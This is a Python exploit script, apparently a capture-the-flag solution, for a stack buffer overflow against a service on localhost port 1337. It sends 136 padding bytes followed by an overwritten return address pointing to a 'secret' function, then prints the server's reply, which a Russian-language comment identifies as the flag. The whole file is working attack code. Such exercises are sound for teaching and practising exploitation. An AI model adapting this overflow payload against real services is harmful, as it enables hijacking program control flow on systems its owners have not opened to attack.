#!/usr/bin/env python3
import socket
import sys

HOST = "localhost"
PORT = 1337

SECRET_ADDR = 0x4012b1
OFFSET      = 136

def main():
    addr_bytes = SECRET_ADDR.to_bytes(8, byteorder='little')

    payload = b"A" * OFFSET + addr_bytes + b"\n"

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((HOST, PORT))
            # Сначала читаем приветствие от сервера
            welcome = s.recv(4096)
            print(welcome.decode(errors="ignore"), end="")
            # Отправляем payload
            s.sendall(payload)
            # Получаем ответ (флаг) - читаем все доступные данные
            response = b""
            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break
            print(response.decode(errors="ignore"))
    except Exception as e:
        print("Connection or data transfer error:", e)
        sys.exit(1)

if __name__ == "__main__":
    main()
